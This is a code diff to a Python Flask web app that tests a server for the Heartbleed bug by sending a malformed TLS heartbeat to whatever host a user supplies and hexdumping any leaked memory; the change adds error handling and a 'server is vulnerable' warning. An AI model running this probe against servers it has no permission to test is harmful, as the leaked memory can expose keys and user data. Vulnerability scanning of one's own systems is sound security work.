@@ -88,42 +88,50 @@ def hit_hb(s):
             return 'No heartbeat response received, server likely not vulnerable'
  
         if typ == 24:
-            return 'Received heartbeat response:\n' + hexdump(pay)
+            if len(pay) > 3:
+                return 'Received heartbeat response:\n' + hexdump(pay) + '\nWARNING: server returned more data than it should - server is vulnerable!'
+            else:
+                return 'Received heartbeat response:\n' + hexdump(pay) + '\nServer processed malformed heartbeat, but did not return any extra data.'
  
         if typ == 21:
             return 'Received alert:\n' + hexdump(pay) + '\nServer returned error, likely not vulnerable'
 
 @app.route("/hello") 
 def respond():
-    url = request.args.get('url')
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #print 'Connecting...'
-    sys.stdout.flush()
-    s.connect((url, 443))
+    try:
+        url = request.args.get('url')
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #print 'Connecting...'
+        sys.stdout.flush()
+        s.connect((url, 443))
  
-    if False:                    #starttls
-        re = s.recv(4096)
-        s.send('ehlo starttlstest\n')
-        re = s.recv(1024)
-        if not 'STARTTLS' in re:
-            return 'STARTTLS not supported...'
-        s.send('starttls\n')
-        re = s.recv(1024)
+        if False:                    #starttls
+            re = s.recv(4096)
+            s.send('ehlo starttlstest\n')
+            re = s.recv(1024)
+            if not 'STARTTLS' in re:
+                return 'STARTTLS not supported...'
+            s.send('starttls\n')
+            re = s.recv(1024)
     
-    #print 'Sending Client Hello...'
-    s.send(hello)
-    #print 'Waiting for Server Hello...'
-    while True:
-        typ, ver, pay = recvmsg(s)
-        if typ == None:
-            return 'Server closed connection without sending Server Hello.'
-        # Look for server hello done message.
-        if typ == 22 and ord(pay[0]) == 0x0E:
-            break
+        #print 'Sending Client Hello...'
+        s.send(hello)
+        #print 'Waiting for Server Hello...'
+        while True:
+            typ, ver, pay = recvmsg(s)
+            if typ == None:
+                return 'Server closed connection without sending Server Hello.'
+            # Look for server hello done message.
+            if typ == 22 and ord(pay[0]) == 0x0E:
+                break
  
-    #print 'Sending heartbeat request...'
-    s.send(hb)
-    return hit_hb(s)
+        #print 'Sending heartbeat request...'
+        s.send(hb)
+        return hit_hb(s)
+    except socket.error:
+        return "Error communicating with the web server"
+    except:
+        return "Wrong input"
 
 @app.route('/')
 def root():
